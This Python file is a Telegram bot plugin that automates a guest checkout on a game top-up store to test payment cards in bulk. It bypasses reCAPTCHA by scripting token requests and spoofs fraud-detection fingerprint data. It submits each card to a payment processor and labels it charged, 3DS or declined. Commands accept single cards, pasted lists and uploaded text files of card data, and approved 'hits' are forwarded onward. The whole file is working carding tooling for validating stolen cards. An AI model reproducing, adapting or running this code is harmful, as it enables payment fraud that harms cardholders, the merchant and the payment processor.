import time
import asyncio
import re
import os
import json
import base64
import random
import string
import uuid
import httpx
from urllib.parse import urljoin
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

GATE_NAME = "Zen Payments - GameSeal"
BASE = "https://gameseal.com"
PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"
PUBG_ID = "51458699098"

ADDRESS = {
    "street": "-Not-specified-",
    "postal_code": "00-000",
    "city": "-Not-specified-",
    "country_id": "a9ad9f2a583b4e258d911f0164109fef",
}

SALUTATION_ID = "cff3f5378c004217b7924137dc4d2789"
PAYMENT_METHOD_ID = "018e80175b3c7345b87e04248d87c021"
FIELDSET_ID = "019bea273e3172e99f8de1bfb2a99c29"

RECAPTCHA_SITEKEY = "6Ldp1ckkAAAAAFO5g616r_vvFaihGgKkWut3cBli"
RECAPTCHA_CO = "aHR0cHM6Ly9nYW1lc2VhbC5jb206NDQz"

# Limits
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def parse_card(cc_str):
    parts = cc_str.strip().split("|")
    if len(parts) != 4:
        return None
    number, month, year, cvv = parts
    month = month.strip().zfill(2)
    year = year.strip()
    if len(year) == 2:
        year = "20" + year
    return {
        "number": number.strip(),
        "month": month,
        "year": year,
        "cvv": cvv.strip(),
    }

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f"{name}{random.randint(100, 9999)}@gmail.com"

def extract_csrf(html):
    patterns = [
        r'name="csrf[_-]token"\s+(?:content|value)="([^"]+)"',
        r'value="([^"]+)"\s+name="csrf[_-]token"',
        r'name="_csrf_token"\s+(?:content|value)="([^"]+)"',
        r'"csrfToken":\s*"([^"]+)"',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

async def get_recaptcha_token(session):
    try:
        resp = await session.get(
            f"https://www.recaptcha.net/recaptcha/api.js?render={RECAPTCHA_SITEKEY}",
            headers={"Referer": f"{BASE}/"},
        )
        v_match = re.search(r"releases/([^/]+)/recaptcha", resp.text)
        if not v_match:
            return None
        v = v_match.group(1)

        anchor_url = (
            f"https://www.recaptcha.net/recaptcha/api2/anchor"
            f"?ar=1&k={RECAPTCHA_SITEKEY}&co={RECAPTCHA_CO}&hl=en&v={v}&size=invisible"
        )
        resp = await session.get(anchor_url, headers={"Referer": f"{BASE}/"})
        m = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', resp.text)
        if not m:
            return None

        resp = await session.post(
            f"https://www.recaptcha.net/recaptcha/api2/reload?k={RECAPTCHA_SITEKEY}",
            data={
                "v": v, "reason": "q", "c": m.group(1), "k": RECAPTCHA_SITEKEY,
                "co": RECAPTCHA_CO, "hl": "en", "size": "invisible",
                "chr": "%5B89%2C64%2C27%5D", "vh": "13599012192", "bg": "",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": anchor_url},
        )
        rr = re.search(r'\["rresp","([^"]+)"', resp.text)
        return rr.group(1) if rr else None
    except:
        return None

def extract_cards(text):
    """Extract credit card patterns from text"""
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN CHECK FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════

async def call_gameseal_api(fullcc):
    """Call GameSeal Zen Payments API to check credit card"""
    try:
        card = parse_card(fullcc)
        if not card:
            return "Error", "Invalid card format", GATE_NAME, "0s"
        
        cc = card["number"]
        exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
        cc_full = f"{cc}|{card['month']}|{card['year']}|{card['cvv']}"
        email = random_email()
        
        async with httpx.AsyncClient(timeout=120, follow_redirects=True) as sess:
            sess.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            })
            
            html_headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Upgrade-Insecure-Requests": "1",
            }
            
            # Step 1-2: Homepage + Product
            resp = await sess.get(f"{BASE}/", headers={**html_headers, "Sec-Fetch-Site": "none"})
            csrf = extract_csrf(resp.text)
            resp = await sess.get(f"{BASE}/{PRODUCT_SLUG}", headers={**html_headers, "Referer": f"{BASE}/"})
            csrf = extract_csrf(resp.text) or csrf
            
            # Step 3: Validate + Add to cart
            await sess.post(f"{BASE}/topups/validate-fields", headers={
                "Accept": "application/json", "Content-Type": "application/json",
                "Origin": BASE, "Referer": f"{BASE}/{PRODUCT_SLUG}",
            }, json={"productId": PRODUCT_ID, "fields": {"playerid": PUBG_ID}})
            
            boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
            payload_json = json.dumps({
                "topupFields": {"playerid": {"label": "Player ID", "value": PUBG_ID, "displayLabel": PUBG_ID}},
                "fieldsetId": FIELDSET_ID,
            })
            pid = PRODUCT_ID
            parts = [
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][quantity]"\r\n\r\n1',
                f'--{boundary}\r\nContent-Disposition: form-data; name="redirectTo"\r\n\r\nfrontend.checkout.cart.page',
                f'--{boundary}\r\nContent-Disposition: form-data; name="redirectUrl"\r\n\r\n/checkout/cart',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][id]"\r\n\r\n{pid}',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][type]"\r\n\r\nproduct',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][referencedId]"\r\n\r\n{pid}',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][stackable]"\r\n\r\n1',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][removable]"\r\n\r\n1',
                f'--{boundary}\r\nContent-Disposition: form-data; name="platform-name"\r\n\r\nPUBG mobile',
                f'--{boundary}\r\nContent-Disposition: form-data; name="type-name"\r\n\r\nDirect Top-Up',
                f'--{boundary}\r\nContent-Disposition: form-data; name="product-name"\r\n\r\nPUBG Mobile 60 UC (Unknown Cash) Direct Top-Up - GLOBAL',
                f'--{boundary}\r\nContent-Disposition: form-data; name="brand-name"\r\n\r\nPUBG Mobile',
                f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-currency-code"\r\n\r\nEUR',
                f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-product-price"\r\n\r\n0.82',
                f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-product-sku"\r\n\r\nSW98189',
                f'--{boundary}\r\nContent-Disposition: form-data; name="atc_placement"\r\n\r\npdp-buynow',
                f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][payload]"\r\n\r\n{payload_json}',
            ]
            body = '\r\n'.join(parts) + f'\r\n--{boundary}--\r\n'
            await sess.post(f"{BASE}/checkout/line-item/add", headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                **html_headers, "Origin": BASE, "Referer": f"{BASE}/{PRODUCT_SLUG}",
            }, data=body.encode())
            
            # Step 4: Cart
            resp = await sess.get(f"{BASE}/checkout/cart", headers={**html_headers, "Referer": f"{BASE}/{PRODUCT_SLUG}"})
            csrf = extract_csrf(resp.text) or csrf
            
            # Step 5: Register guest
            recaptcha_token = await get_recaptcha_token(sess)
            reg_data = {
                "redirectTo": "frontend.checkout.confirm.page",
                "redirectParameters": "", "errorRoute": "frontend.checkout.cart.page",
                "errorParameters": "", "email": email, "createCustomerAccount": "0",
                "acceptedDataProtection": "1", "salutationId": SALUTATION_ID,
                "firstName": "-Not-specified-", "lastName": "-Not-specified-",
                "billingAddress[street]": ADDRESS["street"],
                "billingAddress[zipcode]": ADDRESS["postal_code"],
                "billingAddress[city]": ADDRESS["city"],
                "billingAddress[countryId]": ADDRESS["country_id"],
            }
            if recaptcha_token:
                reg_data["_grecaptcha_v3"] = recaptcha_token
            
            resp = await sess.post(f"{BASE}/account/register", headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers, "Origin": BASE, "Referer": f"{BASE}/checkout/cart",
            }, data=reg_data)
            
            if resp.status_code == 403 or "/checkout/cart" in str(resp.url):
                return "Error", "Registration blocked (reCAPTCHA)", GATE_NAME, "0s"
            
            csrf = extract_csrf(resp.text) or csrf
            
            # Step 6: Configure checkout
            if "/checkout/confirm" not in str(resp.url):
                resp = await sess.get(f"{BASE}/checkout/confirm", headers={**html_headers, "Referer": f"{BASE}/account/register"})
                csrf = extract_csrf(resp.text) or csrf
            
            await sess.post(f"{BASE}/checkout/configure", headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers, "Origin": BASE, "Referer": f"{BASE}/checkout/confirm",
            }, data={
                "redirectTo": "frontend.checkout.confirm.page",
                "redirectParameters": '{"redirected":0}',
                "countryGroup": ADDRESS["country_id"],
                "paymentMethodId": PAYMENT_METHOD_ID,
            })
            
            # Step 7: Place order
            resp = await sess.post(f"{BASE}/checkout/order", headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers, "Origin": BASE, "Referer": f"{BASE}/account/order",
                "Cache-Control": "max-age=0",
            }, data={
                "gs-street": ADDRESS["street"], "gs-postal-code": ADDRESS["postal_code"],
                "gs-city": ADDRESS["city"], "gs-country": ADDRESS["country_id"],
                "tos": "true", "GsNethoneSessionIdentifier": uuid.uuid4().hex,
            })
            
            zen_url = None
            if resp.status_code in (301, 302, 303):
                zen_url = resp.headers.get("Location", "")
                if not zen_url.startswith("http"):
                    zen_url = urljoin(BASE, zen_url)
            
            if not zen_url or "zen.com" not in zen_url:
                return "Error", "No ZEN redirect", GATE_NAME, "0s"
            
            checkout_id = zen_url.rstrip("/").split("/")[-1].split("?")[0]
            
            # Step 8: ZEN payment setup
            ZEN = "https://secure.zen.com"
            zh = {
                "Accept": "application/json", "Referer": f"{ZEN}/{checkout_id}",
                "Origin": ZEN, "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
            }
            
            await sess.get(zen_url, headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": f"{BASE}/checkout/order",
            })
            
            await sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh)
            resp_checkout = await sess.get(f"{ZEN}/api/v2/checkouts/{checkout_id}", headers=zh)
            checkout_data = resp_checkout.json() if resp_checkout.status_code == 200 else {}
            
            amount = checkout_data.get("amount", "0.82")
            currency = checkout_data.get("currency", "EUR")
            price_str = f"{amount} {currency}"
            
            # Get termsId
            channel_variant = "COR_MASTERCARD" if cc[0] == "5" else "COR_VISA"
            resp = await sess.get(
                f"{ZEN}/api/v1/checkouts/{checkout_id}/available-payment-methods",
                headers=zh, params={"country": "PK", "offset": 0, "limit": 50},
            )
            terms_id = None
            
            def find_terms(obj):
                if isinstance(obj, dict):
                    if "termsId" in obj and obj["termsId"]:
                        return obj["termsId"]
                    for v in obj.values():
                        r = find_terms(v)
                        if r:
                            return r
                elif isinstance(obj, list):
                    for item in obj:
                        r = find_terms(item)
                        if r:
                            return r
                return None
            
            if resp.status_code == 200:
                terms_id = find_terms(resp.json())
            
            if not terms_id:
                terms_id = find_terms(checkout_data)
            
            if not terms_id:
                terms_id = "fafb2ee2-93ba-496b-b3c3-ec1794a41fbe"
            
            # BIN check
            await sess.post(
                f"{ZEN}/api/checkouts/{checkout_id}/acquire-card-currency",
                headers={**zh, "Content-Type": "application/json"},
                json={"cardNumber": cc},
            )
            
            # Step 9: Submit payment
            tm_session = str(uuid.uuid4())
            fp = json.dumps({"version": "1.4.1", "metadata": {}, "data": [{"name": "THREATMETRIX", "value": tm_session}]})
            
            payload = {
                "channelCode": "PCL_CARD",
                "fraudFields": {
                    "browserData": {
                        "availableScreenResolution": [1536, 816], "colorDepth": 32,
                        "javaEnabled": False, "language": "en-US",
                        "screenResolution": [1536, 864], "timezone": "Asia/Karachi",
                        "timezoneOffset": -300, "userAgent": str(sess.headers.get("User-Agent")),
                    },
                    "fingerPrintId": "ZEN;" + base64.b64encode(fp.encode()).decode(),
                },
                "cardPayment": {"cvv": card["cvv"], "number": cc, "expirationDate": exp},
                "aft": False,
                "channelVariant": channel_variant,
            }
            if terms_id:
                payload["termsId"] = terms_id
            
            resp = await sess.post(
                f"{ZEN}/api/checkouts/{checkout_id}/payments",
                headers={**zh, "Content-Type": "application/json"},
                json=payload,
            )
            
            if resp.status_code in (200, 201):
                result = resp.json()
                status = result.get("status", "UNKNOWN").upper()
                txn_id = result.get("id", result.get("transactionId", ""))
                
                if status == "PAYMENT_STARTED" and txn_id:
                    await asyncio.sleep(2)
                    
                    await sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh)
                    
                    summary_resp = await sess.get(f"{ZEN}/api/checkouts/{checkout_id}/summary", headers=zh)
                    summary = summary_resp.json() if summary_resp.status_code == 200 else {}
                    
                    def has_3ds(obj):
                        s = json.dumps(obj) if isinstance(obj, (dict, list)) else str(obj)
                        return "cardauth" in s or "threeds" in s.lower() or "3ds" in s.lower()
                    
                    if has_3ds(summary):
                        status = "3DS"
                    else:
                        await sess.patch(
                            f"{ZEN}/api/checkouts/{checkout_id}/payments/{txn_id}/redirect",
                            headers={**zh, "Content-Type": "application/json"},
                            json={},
                        )
                        
                        for _ in range(10):
                            await asyncio.sleep(2)
                            sr = await sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh)
                            if sr.status_code == 200:
                                sd = sr.json()
                                new_status = sd.get("status", "")
                                if new_status == "PAYMENT_REJECTED":
                                    status = "DECLINED"
                                    break
                                elif new_status == "PAYMENT_ACCEPTED":
                                    status = "CHARGED"
                                    break
                                elif new_status not in ("", "PAYMENT_STARTED"):
                                    status = new_status
                                    break
                            
                            sm = await sess.get(f"{ZEN}/api/checkouts/{checkout_id}/summary", headers=zh)
                            if sm.status_code == 200:
                                sm_data = sm.json()
                                if has_3ds(sm_data):
                                    status = "3DS"
                                    break
                
                if status == "CHARGED":
                    return "Approved ✓", f"Charged {price_str}", GATE_NAME, "0s"
                elif status == "3DS":
                    return "Pending ⏳", "3DS Required", GATE_NAME, "0s"
                elif status == "DECLINED":
                    return "Declined ✗", "Card Declined", GATE_NAME, "0s"
                else:
                    return "Declined ✗", status, GATE_NAME, "0s"
            
            elif resp.status_code in (400, 422):
                return "Declined ✗", "Payment Failed", GATE_NAME, "0s"
            else:
                return "Error", f"HTTP {resp.status_code}", GATE_NAME, "0s"
                
    except Exception as e:
        return "Error", str(e)[:50], GATE_NAME, "0s"

# ═══════════════════════════════════════════════════════════════════════════════
# BOT COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

# --- SINGLE CHECK COMMAND (/gs) ---
@Client.on_message(filters.command("gs", [".", "/"]))
async def gameseal_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        
        if checkall[0] == False:
            return
        role = checkall[1]
        
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /gs

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /gs cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway, time_taken = await call_gameseal_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ-» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
💠 𝘽ɪɴ-» {brand}_{type_}-{level}
💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
════『 META 』════
💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
💠 𝙏ɪᴍᴇ-» {time.perf_counter() - start:.2f}s
💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, finalresp)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND (/mgs) ---
@Client.on_message(filters.command("mgs", [".", "/"]))
async def gameseal_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mgs

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mgs cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND (/tgs) ---
@Client.on_message(filters.command("tgs", [".", "/"]))
async def gameseal_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tgs

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    """Process multiple cards one by one with live updates"""
    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

💠 𝙂𝙖𝙩𝙚 -» {GATE_NAME}
💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
━━━━━━━━━━━━━━━━━━━━"""
    progress_msg = await message.reply(initial_resp, quote=True, parse_mode=enums.ParseMode.HTML)
    
    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
━━━━━━━━━━━━━━━━━━━━
"""
    final_text = header_text
    start_time = time.perf_counter()
    gateway = GATE_NAME
    
    for fullcc in ccs:
        status, response, gateway, time_taken = await call_gameseal_api(fullcc)
        
        cc_num = fullcc.split("|")[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩ᴜꜱ-» {status}
💠 𝙍ᴇꜱᴜʟᴛ-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾ᴏᴜɴᴛʀʏ-» {country} {flag}
💠 𝘽ɪɴ-» {brand}_{type_}-{level}
💠 𝘽ᴀɴᴋ-» {bank}</blockquote>
━━━━━━━━━━━━━━━━━━━━
"""
        final_text += card_resp
        
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        except Exception:
            pass
        
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    footer = f"""════『 META 』════
💠 𝙂ᴀᴛᴇᴡᴀʏ -» {gateway}
💠 𝙏ɪᴍᴇ-» {elapsed_time}s
💠 𝘾ʜᴇᴄᴋᴇᴅ ʙʏ-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
    
    final_text += footer
    await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
    await setantispamtime(user_id)
